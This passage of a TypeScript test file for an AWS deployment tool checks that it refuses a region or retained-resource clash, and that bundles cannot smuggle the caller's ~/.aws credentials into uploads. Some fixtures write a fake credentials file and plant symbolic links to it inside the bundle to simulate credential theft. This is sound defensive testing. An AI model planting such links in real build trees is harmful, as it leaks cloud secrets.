  assert.equal(r.code, 0, r.err);
  assert.ok(!s.calls.some((x) => x.cmd === 'docker' && x.args[0] === 'build'));
}));

test('shu-9bj.8: the fence-clash refusal says a stack in another region or a retained resource can cause it', withTmp(async (tmp) => {
  const { dir } = consumer(tmp, (c) => { c.project = 'orb'; c.qualifier = 'orb'; });
  const r = await cli(['bootstrap', 'orb', '--repo', 'owner/consumer'], { cwd: dir, spawn: recordingSpawn().spawn, aws: accountWith('orb', [], []).aws });
  assert.equal(r.code, 1);
  assert.match(r.err, /stack of orb in another region, or a resource a deleted stack retained, also causes this refusal/);
}));

test('shu-9bj.8: a later project step that swaps the checked bundle in the tree for a link to ~/.aws uploads nothing from there: the upload reads a host-only copy', withTmp(async (tmp) => {
  const fakeHome = join(tmp, 'home');
  write(join(fakeHome, '.aws', 'credentials'), '[default]\naws_secret_access_key = caller-secret\n');
  const { dir } = consumer(tmp);
  let inTree = '';
  const s = recordingSpawn(({ cmd, args, options }) => {
    if (cmd === 'bash' && args[0]?.endsWith('bundle.sh')) {
      const r = bundleInTree(bundleDir(tmp), options.cwd);
      inTree = join(options.cwd, '.next', 'shukka-bundle');
      return r;
    }
    if (cmd === 'npx' && args.includes('synth')) {
      // synth runs after the bundle was checked, with the tree mounted read-write: it swaps the bundle for a link.
      rmSync(inTree, { recursive: true, force: true });
      symlinkSync(fakeHome, inTree);
      const out = args[args.indexOf('--output') + 1]!;
      write(join(out, 'manifest.json'), JSON.stringify({ artifacts: { 'shukkatest-App': { type: 'aws:cloudformation:stack', properties: { tags: { Project: 'shukkatest' } } } } }));
      return { status: 0, stdout: '' };
    }
    if (cmd === process.execPath && args[1] === 'diff') return { status: 0, stdout: CLEAN_DIFF };
    return { status: 0, stdout: '' };
  });
  const c = releaseClients();
  const r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: awsWith(c).aws, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 0, r.out + r.err);
  assert.ok(inTree !== '', 'the bundle script ran');
  const put = c.s3.calls.find((x) => String(x.input.Key).endsWith('.tgz'))!;
  const tgz = join(tmp, 'uploaded.tgz');
  writeFileSync(tgz, put.input.Body);
  const listing = execFileSync('tar', ['-tzf', tgz], { encoding: 'utf8' });
  const content = execFileSync('tar', ['-xzOf', tgz], { encoding: 'utf8' });
  assert.match(listing, /server\.js/, 'the bundle that was checked is the one uploaded');
  assert.ok(!/credentials|\.aws/.test(listing) && !content.includes('caller-secret'), `nothing from the fake home: ${listing}`);
}));

test('shu-9bj.8: a bundle holding a link that leaves it is refused before it is copied', withTmp(async (tmp) => {
  const fakeHome = join(tmp, 'home');
  write(join(fakeHome, '.aws', 'credentials'), 'secret\n');
  const { dir } = consumer(tmp);
  const s = recordingSpawn(({ cmd, args, options }) => {
    if (cmd === 'bash' && args[0]?.endsWith('bundle.sh')) {
      const r = bundleInTree(bundleDir(tmp), options.cwd);
      symlinkSync(join(fakeHome, '.aws'), join(options.cwd, '.next', 'shukka-bundle', 'aws'));
      return r;
    }
    return { status: 0, stdout: '' };
  });
  const c = releaseClients();
  const r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: awsWith(c).aws, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 1);
  assert.match(r.err, /refusing the bundle .*:\nshukka: refused: aws is a symbolic link to an absolute path/);
  assert.equal(c.s3.calls.length, 0);
}));
